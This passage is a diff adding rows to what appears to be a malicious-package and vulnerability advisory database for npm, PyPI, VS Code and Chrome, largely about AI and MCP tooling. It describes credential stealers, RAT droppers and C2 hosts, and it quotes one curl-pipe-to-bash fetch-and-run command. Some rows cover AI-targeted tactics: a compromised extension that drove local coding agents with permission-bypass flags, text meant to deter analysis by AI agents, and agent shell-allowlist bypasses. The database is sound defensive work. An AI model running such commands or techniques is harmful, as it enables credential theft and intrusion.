+    "advisory": "MCP-scoped impersonation of vite (package.json claims the Vite authors, ships a vite source tree and a 'vite' bin) with an obfuscated IIFE hidden after a whitespace-padded line in bin/vite.js; the only non-holder version ever published. Source: Amazon Inspector (OSV MAL-2026-10525, 2026-07-14), Checkmarx Zero (Pavan Gudimalla, ViteVenom campaign), npm GHSA-mqf9-3wx8-45cj."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "prime-coding-agent",
+    "advisory": "imjustbetterxd campaign (2026-09): a functional AI coding-agent CLI whose default provider endpoint is attacker-run, so every request carries the user's provider API key plus the prompt and code context to the operator; later builds set rejectUnauthorized:false (sole version 3.10.6; relays /v1/chat with the provider key to apex-api-ten.vercel[.]app; reads EXA_API_KEY and NVIDIA_API_KEY; codelake CLR-2026-3052, OSV MAL-2026-16014). Source: codelake Research (first catch 2026-09-04), OpenSSF malicious-packages."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "agent-free",
+    "advisory": "imjustbetterxd campaign (2026-09): a functional AI coding-agent CLI whose default provider endpoint is attacker-run, so every request carries the user's provider API key plus the prompt and code context to the operator; later builds set rejectUnauthorized:false (version 1.0.0; relay to fireworks-endpoint--57crestcrepe.replit[.]app; codelake CLR-2026-3051, OSV MAL-2026-16013). Source: codelake Research (first catch 2026-09-04), OpenSSF malicious-packages."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "orbitron-tui",
+    "advisory": "imjustbetterxd campaign (2026-09): a functional AI coding-agent CLI whose default provider endpoint is attacker-run, so every request carries the user's provider API key plus the prompt and code context to the operator; later builds set rejectUnauthorized:false (all 84 versions 0.1.2 to 1.0.29; codelake CLR-2026-3049, GHSA-q9gw-fmw5-2mwc). Source: codelake Research (first catch 2026-09-04), OpenSSF malicious-packages."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "orbitron-cli",
+    "advisory": "imjustbetterxd campaign (2026-09): a functional AI coding-agent CLI whose default provider endpoint is attacker-run, so every request carries the user's provider API key plus the prompt and code context to the operator; later builds set rejectUnauthorized:false (sole version 1.0.1; codelake CLR-2026-3050, OSV MAL-2026-16012 / GHSA-4m89-qrv7-j3hv). Source: codelake Research (first catch 2026-09-04), OpenSSF malicious-packages."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "codebuff-cli",
+    "advisory": "imjustbetterxd campaign (2026-09): a functional AI coding-agent CLI whose default provider endpoint is attacker-run, so every request carries the user's provider API key plus the prompt and code context to the operator; later builds set rejectUnauthorized:false (impersonates the legitimate codebuff package with its README copied; relays the Codebuff API key, code and chat to attacker backends and disables TLS verification in 1.1.3; Amazon Inspector OSV MAL-2026-4533 (2026-05-22), codelake CLR-2026-3046). Source: codelake Research (first catch 2026-09-04), OpenSSF malicious-packages."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "agentwork-cli",
+    "version_range": ">=0.1.4, <=0.1.5",
+    "advisory": "Compromised as a node of the TeamPCP 'Mini Shai-Hulud is back' worm (2026-05): steals credentials, propagates to every package the stolen token can publish and attempts persistence. Affected 0.1.4 and 0.1.5 only. Source: Google Open Source Security (OSV MAL-2026-3605), StepSecurity, Socket Threat Research and Aikido (TanStack compromise), GitHub Advisory Database GHSA-6pwg-cfc3-f685."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "nebula-llm",
+    "advisory": "NEBULA campaign: fake 'NebulaAI' LLM SDK whose preinstall.cjs embeds a 257 KB base64+zlib Windows PE, writes it to %LOCALAPPDATA%\\Microsoft\\Conhost\\conhost.exe and spawns it detached: a modified KNTRAT RAT (direct syscalls, HVNC, audio/video capture, Winlogon Shell persistence), C2 65.87.7[.]132. Seven packages from accounts nebulallms..nebulallms4. Source: Amazon Inspector (OSV MAL-2026-17227 / GHSA-5ph8-m4r7-g739, 2026-09-28), CloudSEK (Vikas Kundu, 2026-10-08)."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "llm-nebula",
+    "advisory": "NEBULA campaign sibling of nebula-llm: presents as an LLM SDK; 'preinstall: node preinstall.cjs' runs a 232 KB obfuscated blob that drops the KNTRAT loader. All versions removed by npm 2026-10-12. Source: Amazon Inspector (GHSA-8g48-f52v-xggv), npm Security (GHSA-w7wp-5j6j-rgg5), CloudSEK."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "api-nebula",
+    "advisory": "Third named NEBULA-campaign package: fake AI SDK dropping the KNTRAT Windows RAT. Source: Amazon Inspector (OSV MAL-2026-17531 / GHSA-q4h6-37pw-8pc9, 2026-10-05), CloudSEK (Vikas Kundu)."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "gemini-computer-use",
+    "advisory": "bin/cli.js (npx gemini-computer-use) spawns 'curl -fsSL https://smart-server[.]online/install.sh | bash' on Unix and the PowerShell equivalent on Windows from an unpinned third-party host; identical entrypoint in every published version (0.1.2 through 0.4.5), package still live. Source: Amazon Inspector and OpenSSF Package Analysis (OSV MAL-2026-16355), GitHub Advisory Database GHSA-4cwr-c4gf-f9r4 (critical)."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@cyanheads/git-mcp-server",
+    "version_range": "<2.15.2",
+    "advisory": "CVE-2026-85626 (GHSA-p58h-f635-vjjm, high): argument injection in the ref and object parameters of git_log, git_diff and git_show (no leading-dash validation), so an attacker injects options such as --output= to write files to arbitrary paths. Fixed 2.15.2 (commit 1b45cf2a); 2.15.3 fixed a flag allow-list regression, so upgrade to 2.15.3. Reported by George Chen (geo-chen, cyanheads/git-mcp-server#53) and Jashn Wahi. Distinct from the <2.1.5 row (CVE-2025-53107). Verified against the CVE record and fix commit 2026-10-22."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@modelcontextprotocol/client",
+    "version_range": ">=2.0.0, <2.3.0",
+    "advisory": "MCP TypeScript SDK v2 split package: CVE-2026-104850 / GHSA-6qxp-vccf-f47h (OAuth credentials sent to the server-chosen authorization server, fixed 2.2.0) and CVE-2026-111769 / GHSA-6prh-2h8m-c8cw (cross-origin redirects re-send custom headers and bodies, fixed 2.3.0). Fixed: 2.3.0. Source: modelcontextprotocol/typescript-sdk advisories (reporters nickelsec; Aviral2642 and others). Verified against primary sources 2026-10-22."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@modelcontextprotocol/server",
+    "version_range": ">=2.0.0, <2.3.0",
+    "advisory": "MCP TypeScript SDK v2 split package: CVE-2026-111770 / GHSA-jm63-cq47-j5jp (shared transport/server instances delivered one HTTP client's messages to another), CVE-2026-111768 (memory exhaustion), CVE-2026-111771 (bearer tokens for another service accepted), all fixed 2.3.0; GHSA-f897-62hf-6gxq (no body-size limit) fixed 2.1.0. Fixed: 2.3.0. Source: modelcontextprotocol/typescript-sdk advisories (reporters DavidCarliez, legitu1337 and others). Verified against primary sources 2026-10-22."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@modelcontextprotocol/express",
+    "version_range": ">=2.0.0, <2.0.2",
+    "advisory": "MCP TypeScript SDK v2 split package: CVE-2026-111771 / GHSA-rvq5-wwqv-78pq (medium): server bearer authentication accepted tokens issued for another service. Fixed 2.0.2 (sibling @modelcontextprotocol/server-legacy fixed 2.3.1). Source: modelcontextprotocol/typescript-sdk advisories (reporter gdegrange). Verified against primary sources 2026-10-22."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@modelcontextprotocol/node",
+    "version_range": ">=2.0.0, <2.1.0",
+    "advisory": "MCP TypeScript SDK v2 split package: GHSA-f897-62hf-6gxq (high, no CVE): HTTP server transports did not limit request body size or JSON-RPC batch length (DoS). Fixed 2.1.0 (sibling @modelcontextprotocol/hono fixed 2.0.1). Source: modelcontextprotocol/typescript-sdk advisories (fix by maxisbey; reporters cybercraftsolutionsllc, hewei-gikaku, Jvr2022, Gal3m and others). Verified against primary sources 2026-10-22."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@modelcontextprotocol/inspector",
+    "version_range": ">=2.0.0, <2.12.0",
+    "advisory": "MCP Inspector 2.x line, fixed 2.12.0 (2026-10-21): GHSA-q978-78c7-phqw (high, CVSS 8.8: a remote MCP server's OAuth authorization URL reached PowerShell through the 'open' package, so $(...) subexpressions executed during sign-in on Windows/WSL), GHSA-vcc9-3xgm-p9v4 (high: incomplete fix for CVE-2025-49596, DNS-rebinding disclosure of the API token and stored OAuth tokens), GHSA-m5pj-3536-3xcp (medium: /api/fetch proxy has no size cap). Fixed: 2.12.0. Source: modelcontextprotocol/inspector advisories (Pillar Security / eilonc-pillar, 0xParth, hackyhunter, CloneOfAlex). Verified against primary sources 2026-10-22."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "mcp-remote",
+    "version_range": ">=0.1.32, <0.1.39",
+    "advisory": "CVE-2026-51994 and CVE-2026-51995 (GHSA-5wmf-76f4-cg47, CVSS 9.1 / 7.5 per CISA ADP): during OAuth discovery the client fetched Protected Resource Metadata and /.well-known/oauth-authorization-server from whatever origin the MCP server named, with no origin or private-address validation, giving a malicious server blind SSRF and authorization-server misdirection. The CVE records name 0.1.32 through 0.1.38; the researcher's follow-ups report the same code path still present in 0.15.x with no fixed release known, so treat any version as unverified until upstream publishes a fix. Second range alongside the CVE-2025-6514 row. Source: Alex Gercog (playb0t, mcp-remote-oauth-security F-01/F-02, disclosed 2026-07-31). Verified against the CVE records and upstream source 2026-10-22."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "opencode-ai",
+    "version_range": ">=1.14.30, <1.18.22",
+    "advisory": "GHSA-632h-h47v-g4x4 (high, CVSS 7.5, no CVE by maintainer choice): when 'opencode serve' or 'opencode web' runs from an npm, pnpm or Bun install, a cross-origin text/plain form POST to /global/upgrade passes an arbitrary package specifier to the package manager, installing an attacker package and running its lifecycle scripts. curl, Homebrew and other binary installs are not affected, which is why this is keyed to the npm package. Fixed 1.18.22 (anomalyco/opencode#44686). Reported by Christophe Tafani-Dereeper, Datadog Security Labs. (Pillar Security's Windows/WSL-only OAuth PowerShell injection, 1.0.137 to 1.18.32, is not catalogued for lack of a platform field.) Verified against the vendor advisory and fix commit 2026-10-22."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@deepseek-ai/dsh",
+    "version_range": "<0.1.2",
+    "advisory": "CVE-2026-82533 (GHSA-8m2g-8cgm-3vcp, CVSS 9.6, CWE-807): the dsh web host API trusted the Host header for browser authentication, so any web page could drive the local agent. The GHSA maps the CVE to the transitive package @deepseek-ai/dsh-client-connection; the thing installed and run (npx @deepseek-ai/dsh web) is this package, which publishes in lockstep with it. Every affected release is a pre-release (0.0.1-rc.1 through 0.1.1-rc.2); first fixed publish is 0.1.2-alpha.2 (commit 3e24087b, 2026-08-30). Reported by Nir Zadok and Moshe Siman Tov Bustan, OX Research. Verified against NVD, GHSA and the fix commit 2026-10-22."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "litellm",
+    "version": "1.107.0",
+    "advisory": "Second LiteLLM compromise (2026-10-21, live on PyPI 11:39 to 13:20 UTC, about 49k downloads; also Docker/GHCR tags v1.107.0, latest, main-latest, main-stable): all seven wheels, built from a lookalike repo, drop cook.pth, cook.py and sitecustomize.py into the site-packages root so a compiled credential stealer and hourly remote-code loader run on every Python interpreter start even if litellm is never imported, and survive pip uninstall if the stray files remain. Steals browser credentials, SSH and GPG keys, AWS/Azure/GCP/Kubernetes credentials, and the session/token stores of Claude Code, Claude Desktop, Cursor, Windsurf, Codeium, Copilot, Cline, Roo and Cody; exfiltration by plain HTTP to the lookalike www.litellm[.]dev; loader polls a GitHub dead drop (lock file /tmp/remote_code_loader.lock). Only this version is malicious; 1.82.7/1.82.8 were the March TeamPCP compromise. Source: Lidor Machluf (BerriAI/litellm#47826, first report), BerriAI post-mortem, Datadog Security Labs (Ian Kretz), Socket, Wiz Research (Benjamin Read, Rami McCarthy), Upwind Security, OX Security, StepSecurity; OSV MAL-2026-2144 / PYSEC-2026-2."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "memoryos",
+    "version": "2.0.34",
+    "advisory": "PyPI side of the MemTensor sckit compromise (2026-09-23; PEP 503 name memoryos): 2.0.34 carries the same Go implant as the npm plugin, delivered via a custom Poetry build backend that intercepted PYPI_API_TOKEN. Only this version is affected. Source: SafeDep, Amazon Inspector and Kamil Mankowski (kam193) via OSV MAL-2026-16475 / PYSEC-2026-3987, Aikido Security (Oliver Smith)."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "openaii",
+    "advisory": "Campaign 2026-09-openaii (one-character typosquat of openai, 1.55.3; all removed within three days): plants a .pth startup hook in site-packages that downloads the next stage on every interpreter start, hides itself, clears logs, exfiltrates SSH keys and cloud credentials, persists and drops a cryptominer; the .pth carries text meant to discourage analysis by AI agents. Source: Amazon Inspector (finder), Kamil Mankowski / kam193 (analysis), OpenSSF malicious-packages, GitHub Advisory Database."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "langgrap",
+    "advisory": "Campaign 2026-09-openaii (typosquat of langgraph, 0.2.45; all removed within three days): plants a .pth startup hook in site-packages that downloads the next stage on every interpreter start, hides itself, clears logs, exfiltrates SSH keys and cloud credentials, persists and drops a cryptominer; the .pth carries text meant to discourage analysis by AI agents. Source: Amazon Inspector (finder), Kamil Mankowski / kam193 (analysis), OpenSSF malicious-packages, GitHub Advisory Database."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "transfomers",
+    "advisory": "Campaign 2026-09-openaii (typosquat of transformers, 4.44.2; all removed within three days): plants a .pth startup hook in site-packages that downloads the next stage on every interpreter start, hides itself, clears logs, exfiltrates SSH keys and cloud credentials, persists and drops a cryptominer; the .pth carries text meant to discourage analysis by AI agents. Source: Amazon Inspector (finder), Kamil Mankowski / kam193 (analysis), OpenSSF malicious-packages, GitHub Advisory Database."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "ollamaa",
+    "advisory": "Campaign 2026-09-openaii (typosquat of ollama, 0.4.2; all removed within three days): plants a .pth startup hook in site-packages that downloads the next stage on every interpreter start, hides itself, clears logs, exfiltrates SSH keys and cloud credentials, persists and drops a cryptominer; the .pth carries text meant to discourage analysis by AI agents. Source: Amazon Inspector (finder), Kamil Mankowski / kam193 (analysis), OpenSSF malicious-packages, GitHub Advisory Database."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "chroma-client",
+    "advisory": "Chroma-themed package from the 2026-09-openaii campaign (0.5.7): no payload yet at analysis time but uses the campaign's LLM-security-tool-evasion technique, staged for a later payload. Source: kam193 (first report 2026-09-13), Amazon Inspector, OpenSSF malicious-packages MAL-2026-16143 / GHSA-qp4x-pg53-7xh8."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "aanthropic",
+    "advisory": "Typosquat of anthropic published 2026-10-22 (campaign 2026-10-semvver, which the same day squatted semvver, semveer, semverr, ssemver, debbug and deebug): during installation downloads and executes a remote executable. Source: Kamil Mankowski / kam193 via OpenSSF malicious-packages MAL-2026-18189 / GHSA-9793-cg29-78xv."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "anthropic-sdk",
+    "advisory": "Impersonates the Anthropic SDK (0.1.0, 2026-10-04): on import downloads a remote script, fingerprints for sandboxes, then after a delay exfiltrates credentials, environment variables, AI chat files and SSH keys, falling back to DNS exfiltration and holding its config in DNS. Source: Amazon Inspector (finder), Kamil Mankowski / kam193, OpenSSF malicious-packages MAL-2026-17472 / GHSA-xxp4-7566-29xj."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "agentaix",
+    "advisory": "Campaign 2026-10-agentaix (versions 0.1.0 and 0.2.0, 2026-10-10; MAL-2026-17752 / GHSA-7w8h-6mv7-cwm8): agent-themed package whose import-time side effect drops a Python RAT disguised as readme.txt onto the Desktop, polling C2 googleforum.pythonanywhere[.]com for shell execution, file exfiltration and persistence (HKCU Run key). Source: Amazon Inspector (finder), Kamil Mankowski / kam193 (reporter), OpenSSF malicious-packages."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "agent-vx",
+    "advisory": "Campaign 2026-10-agentaix (version 0.1.0, 2026-10-10; MAL-2026-17755 / GHSA-qqmp-mxcj-44p3): agent-themed package whose import-time side effect drops a Python RAT disguised as readme.txt onto the Desktop, polling C2 googleforum.pythonanywhere[.]com for shell execution, file exfiltration and persistence (HKCU Run key). Source: Amazon Inspector (finder), Kamil Mankowski / kam193 (reporter), OpenSSF malicious-packages."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "py-wormgpt",
+    "advisory": "Campaign 2026-10-agentaix (version 1.0.0, 2026-10-15; MAL-2026-17886 / GHSA-q9mx-j265-447m): agent-themed package whose import-time side effect drops a Python RAT disguised as readme.txt onto the Desktop, polling C2 googleforum.pythonanywhere[.]com for shell execution, file exfiltration and persistence (HKCU Run key). Source: Amazon Inspector (finder), Kamil Mankowski / kam193 (reporter), OpenSSF malicious-packages."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "claudedashbord",
+    "advisory": "Lure for 'Claude dashboard' (versions 0.1.0 to 0.1.3, campaign 2026-09-donutautosellsrc, project removed by PyPI): install-time steganographic payload fetch with a native-extension infostealer and blockchain-resolved C2 per kam193; Amazon Inspector additionally describes a .pth file that auto-executes claudedashbord.telemetry on every interpreter start. IOC domains thisisafalsepositive[.]st and sltnnt[.]ru. Source: Kamil Mankowski / kam193, Amazon Inspector, OpenSSF malicious-packages, GitHub Advisory Database."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "marketing-mcp",
+    "advisory": "MCP server whose 'send(path)' tool reads any caller-specified local file and POSTs it to a hardcoded webhook.site capture URL: an exfiltration tool dressed as a marketing MCP (0.1.0, 2026-09-17). Source: Amazon Inspector (finder), Kamil Mankowski / kam193, OpenSSF malicious-packages MAL-2026-16250 / GHSA-7m86-6729-5w7h."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "faiss-cpu-avx512",
+    "advisory": "Impersonates faiss-cpu and ships no FAISS code (versions 1.9.0 to 1.9.7, 2026-09-16): __init__ downloads an xz-compressed binary from files.catbox[.]moe, writes ~/.cache/faiss_cpu_avx512/bin/indexwrm (0755) and restarts it every 5 seconds for the life of the process. Source: pkgwarden (finder, OSSF MAL-2026-16203 / GHSA-rghm-9c3j-wc97)."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "fastmcp",
+    "version_range": ">=2.10.0, <3.4.10",
+    "advisory": "FastMCP 2.x/3.x line, sixteen advisories 2026-10-16 to 10-20. Critical GHSA-gpgx-58w2-xwwf (fixed 3.4.8): remote code execution in the FastMCP client when parsing a server-supplied tool output schema (untrusted schema title passed to pydantic ForwardRef). High GHSA-57vm-5fr9-3r5x (fixed 3.4.8): incomplete fix for CVE-2025-64340, command injection in the 'fastmcp install claude-code' and 'gemini-cli' installers. Also GHSA-7xgj-8392-5q4r (authorization skipped on transformed components, fixed 3.4.10) and GHSA-pwp3-fpg3-p53c (a symlinked SKILL.md escaping its skill folder, fixed 3.4.9). Fixed: 3.4.10 (4.x has its own row; fastmcp-slim shares the bound). Source: PrefectHQ/fastmcp advisories (reporters jlmitra-ampl, 0xParth, rishid, GEONWOOHAN). Verified against primary sources 2026-10-22."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "fastmcp",
+    "version_range": ">=4.0.0, <4.1.2",
+    "advisory": "FastMCP 4.x line: the same October 2026 advisories as the 3.x row (client RCE GHSA-gpgx-58w2-xwwf and installer injection GHSA-57vm-5fr9-3r5x fixed 4.0.11; authorization bypass GHSA-7xgj-8392-5q4r fixed 4.1.2; symlinked SKILL.md GHSA-pwp3-fpg3-p53c fixed 4.1.0) plus GHSA-vqqp-x5qm-5qp4 (CVSS 5.9: OAuth client secret sent to an attacker-advertised authorization server, fixed 4.1.2). Pre-releases 4.0.0a1 onward are affected. Fixed: 4.1.2. Source: PrefectHQ/fastmcp advisories (reporters jlmitra-ampl, 0xParth, rishid, LHMisme420, GEONWOOHAN). Verified against primary sources 2026-10-22."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "mcp",
+    "version_range": ">=2.0.0, <2.2.0",
+    "advisory": "MCP Python SDK 2.x line: the six late-September/October 2026 advisories of the 1.x row (GHSA-qx49-fqc8-xw99 OAuth credential misdirection from 2.0.0a1, CVE-2026-59951 session accumulation, GHSA-rwrf-2pqf-9j8j $ref fetching, GHSA-w4fh-qvv9-3v23 cross-service bearer tokens, GHSA-5h93-6whr-6q8j redirect header leak, all fixed 2.2.0; CVE-2026-109527 unbounded bodies fixed 2.1.0). Fixed: 2.2.0. Source: modelcontextprotocol/python-sdk advisories. Verified against primary sources 2026-10-22."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "mcp-atlassian",
+    "version_range": "<0.22.0",
+    "advisory": "CVE-2026-73498 (GHSA-g5r6-gv6m-f5jv, CVSS 7.7): confluence_upload_attachment passes the client-supplied file_path straight to open(), so any file the MCP process can read (its own CONFLUENCE_API_TOKEN among them) is uploaded to Confluence; also PYSEC-2026-4086/4090/4095/4099. Fixed 0.22.0 (commit b0417334). Reported by rainfantry with analyst Samielakkad. Verified against the vendor advisory 2026-10-22."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "meta-ads-mcp",
+    "version_range": "<1.0.115",
+    "advisory": "CVE-2026-54549 (GHSA-45gf-fjxp-cjpq, high): upload_ad_image fetches an attacker-controlled image_url with no scheme, host or IP validation, giving unauthenticated SSRF to localhost, RFC1918 and cloud metadata when run with the streamable-http transport. Fixed 1.0.115 (commit 7d99263). Reported by EQSTLab with analyst useworld. Verified against the vendor advisory 2026-10-22."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "mistral-vibe",
+    "version_range": ">=1.3.4, <2.25.4",
+    "advisory": "Mistral Vibe coding-agent CLI, Mistral advisory MAI-2026-003 (2026-09-14): six shell-permission bypasses, CVE-2026-87983 (quoted absolute paths), -87984 (redirection targets), -87985 (ANSI-C quoting), -87986 (incomplete parsing), -87987 (environment-variable-prefixed commands, CVSS 10 per NVD) and -87988 (allowlist and path gaps), letting model output run commands the allowlist should have blocked. All fixed 2.25.4. Discovered by HiddenLayer SAI (Esteban Tonglet). Verified against the vendor advisory 2026-10-22."
+  },
+  {
+    "ecosystem": "pypi",
+    "name": "hermes-agent",
+    "version_range": ">=0.18.2, <0.21.1",
+    "advisory": "CVE-2026-71963 (GHSA-7x36-8jrh-v4pw, GitSpawn family): Hermes Agent ran git during context gathering with repository-local core.fsmonitor honoured, executing a prepared repo's command. Fixed in commit f6234d00 (2026-09-02), first tagged in v2026.9.7 as 0.21.1; the PyPI package is stale at 0.19.0, so every PyPI release is affected, and the install script's git clone under ~/.hermes/hermes-agent must be checked by commit ancestry instead. Reported by Manifold Security (Francisco Rosales). Verified against OSV and the fix commit 2026-10-22."
+  },
+  {
+    "ecosystem": "vscode",
+    "name": "aquasecurityofficial.trivy-vulnerability-scanner",
+    "version_range": ">=1.8.12, <=1.8.13",
+    "advisory": "Compromised Open VSX releases of Aqua's Trivy extension (TeamPCP, 2026-02-27 and 02-28; 1.8.11 and earlier are clean on every channel, both bad versions now removed): the payload invoked whichever local AI coding agent was installed (claude, codex, gemini, copilot, kiro-cli) with permission-bypass flags to collect credentials and host details, with 1.8.13 exfiltrating to a GitHub repo via the victim's gh CLI. Only these two versions are flagged. Source: Aqua Security advisory GHSA-8mr6-gf9x-j8qg / CVE-2026-28353, Socket Threat Research, The Hacker News."
+  },
+  {
+    "ecosystem": "vscode",
+    "name": "microsoftvs.microsoftvs",
+    "advisory": "'Aurora Nocturne Night Theme' on the Visual Studio Marketplace by a publisher squatting the 'microsoftvs' name (sole version 1.0.1, 2025-12-15): a colour theme that downloads a payload from fingercakes4sale[.]store, writes it to %TEMP%\\temp_batch.cmd and runs it through cmd.exe; part of a GlassWorm-linked theme cluster. Source: Socket Threat Research (Kirill Boychenko), 2026-10-02."
+  },
+  {
+    "ecosystem": "vscode",
+    "name": "cosmic-themes.theme-cosmic-nebula",
+    "advisory": "'Cosmic Nebula Themes' on both the VS Marketplace and Open VSX: a theme that bundles AES-256-CBC-encrypted JavaScript, decrypts and eval()s remotely supplied code and resolves its C2 from a Solana dead drop; linked to GlassWorm. Removed by Microsoft as malware 2026-02-04. Source: Socket Threat Research (Kirill Boychenko), 2026-10-02; microsoft/vsmarketplace RemovedPackages.md."
+  },
+  {
+    "ecosystem": "vscode",
+    "name": "specstudio.code-wakatime-activity-tracker",
+    "advisory": "GlassWorm 'Zig dropper' (Open VSX, sole version 25.5.9, blocked 2026-04-08): a fake WakaTime tracker whose activate() loads a Zig-compiled Node native addon that enumerates VS Code, Insiders, Cursor, Windsurf, VSCodium and Positron and force-installs a second-stage VSIX into each via --install-extension, then exfiltrates data and drops a RAT and a Chrome extension. Source: Aikido Security (Ilyas Makari), Eclipse Foundation Open VSX blocklist, The Hacker News."
+  },
+  {
+    "ecosystem": "vscode",
+    "name": "floktokbok.autoimport",
+    "advisory": "Second-stage extension planted by the GlassWorm Zig dropper into every IDE on the machine (never on any registry; sideloaded from a GitHub release as autoimport-2.7.9.vsix), impersonating the legitimate steoates.autoimport. Its presence in more than one IDE's extensions directory is itself a dropper signature. Source: Aikido Security (Ilyas Makari), 2026-04-08."
+  },
+  {
+    "ecosystem": "vscode",
+    "name": "helper-beeps.solidity-pro",
+    "advisory": "'Solidity Pro' on Open VSX (Operation Solidity Pro, attributed to WhiteCobra; attacker-owned namespace, all versions): walks the filesystem for wallet vaults, SSH private keys, GitHub, GitLab, AWS, Cloudflare, OpenAI, Telegram and 1Password tokens and exfiltrates them through Telegram bot uploads; interleaves clean decoy versions with malicious ones and delays activation. Source: Yeeth Security (2026-08-06), The Hacker News."
+  },
+  {
+    "ecosystem": "vscode",
+    "name": "helper-beeps.solidity-pro-ai-auditor",
+    "advisory": "'Solidity AI Auditor', sibling listing from the same publisher as helper-beeps.solidity-pro, named in Yeeth Security's malicious-identifier list for Operation Solidity Pro (no independent sample analysis published; the namespace is attacker-owned and no longer exists on any registry). Source: Yeeth Security (2026-08-06)."
+  },
+  {
+    "ecosystem": "vscode",
+    "name": "web3devtoolsx.solidity-pro",
+    "advisory": "Second publisher rotating the Solidity Pro stealer on Open VSX (attributed to WhiteCobra; v3.4.0 is the Telegram infostealer, v1.0.0 and v4.0.0 were same-publisher clean decoys, so the whole namespace is flagged): Cloudflare-fronted C2 then Telegram exfiltration of SSH keys and GitHub, GitLab, AWS, Cloudflare and OpenAI tokens. Source: Yeeth Security (2026-08-06), Eclipse Foundation Open VSX blocklist, The Hacker News."
+  },
+  {
+    "ecosystem": "vscode",
+    "name": "iktok90-design.solidity-pro",
+    "advisory": "'Impostor' third publisher in the Solidity Pro campaign (observed sample 2.4.7, same stealer skeleton; namespace empty on Open VSX after takedown). Source: Yeeth Security (2026-08-06)."
+  },
+  {
+    "ecosystem": "vscode",
+    "name": "alejandroaranda.solidity-languini",
+    "advisory": "EtherDuck (SleepyDuck wave 3) on Open VSX, first wave, v0.9.2 published 2026-09-24 by account janeykomit, download counter inflated by 300K+ in a day to outrank the real juanblanco.solidity: the payload is appended behind custom markers to a 205 MB 'The Duck Song.mp4' shipped in the VSIX; Windows gets ScreenConnect after an elevation chain, macOS/Linux a Go backdoor whose C2 list lives in an Ethereum smart contract. Attacker-created namespace, every version malicious. Source: Pluto Research (Eitan Chassid, Yotam Perkal), 2026-10-01; Eclipse Foundation Open VSX blocklist."
+  },
+  {
+    "ecosystem": "vscode",
+    "name": "alejandroaranda.solidity-langsupport",
+    "advisory": "EtherDuck (SleepyDuck wave 3) on Open VSX, first wave, v0.0.6, same publisher account; host artifacts ~/.solidity/, LaunchAgent com.solidity.langsupport.runner.plist, systemd user unit solidity-langsupport-runner.service: the payload is appended behind custom markers to a 205 MB 'The Duck Song.mp4' shipped in the VSIX; Windows gets ScreenConnect after an elevation chain, macOS/Linux a Go backdoor whose C2 list lives in an Ethereum smart contract. Attacker-created namespace, every version malicious. Source: Pluto Research (Eitan Chassid, Yotam Perkal), 2026-10-01; Eclipse Foundation Open VSX blocklist."
+  },
+  {
+    "ecosystem": "vscode",
+    "name": "juanfranblanco.solidity-vscode",
+    "advisory": "EtherDuck (SleepyDuck wave 3) on Open VSX, re-upload within hours of the first takedown (versions 0.0.189 to 0.0.191, account dbolovetoa) squatting the real author's handle: the payload is appended behind custom markers to a 205 MB 'The Duck Song.mp4' shipped in the VSIX; Windows gets ScreenConnect after an elevation chain, macOS/Linux a Go backdoor whose C2 list lives in an Ethereum smart contract. Attacker-created namespace, every version malicious. Source: Pluto Research (Eitan Chassid, Yotam Perkal), 2026-10-01; Eclipse Foundation Open VSX blocklist."
+  },
+  {
+    "ecosystem": "vscode",
+    "name": "nomic-eth.hardhat-solidity",
+    "advisory": "EtherDuck (SleepyDuck wave 3) on Open VSX, re-upload wave (versions 0.9.2 and 0.9.3, account dbolovetoa) impersonating NomicFoundation.hardhat-solidity: the payload is appended behind custom markers to a 205 MB 'The Duck Song.mp4' shipped in the VSIX; Windows gets ScreenConnect after an elevation chain, macOS/Linux a Go backdoor whose C2 list lives in an Ethereum smart contract. Attacker-created namespace, every version malicious. Source: Pluto Research (Eitan Chassid, Yotam Perkal), 2026-10-01; Eclipse Foundation Open VSX blocklist."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "acaeafediijmccnjlokgcdiojiljfpbe",
+    "advisory": "AiFrame 'ChatGPT Translate' (30,000 installs): one of 32 fake AI-assistant Chrome extensions sharing a single codebase that overlays a full-screen iframe served from operator-controlled tapnetic[.]pro subdomains, scrapes page content, monitors Gmail, captures voice input and exfiltrates; behaviour is backend-controlled so it can change without a Web Store update. 260,000+ users across the campaign. Source: LayerX Security (Natalie Zargarov, Dar Kahllon; now Akamai), 2026-02-12."
+  },
+  {
+    "ecosystem": "chrome",
+    "name": "baonbjckakcpgliaafcodddkoednpjgf",
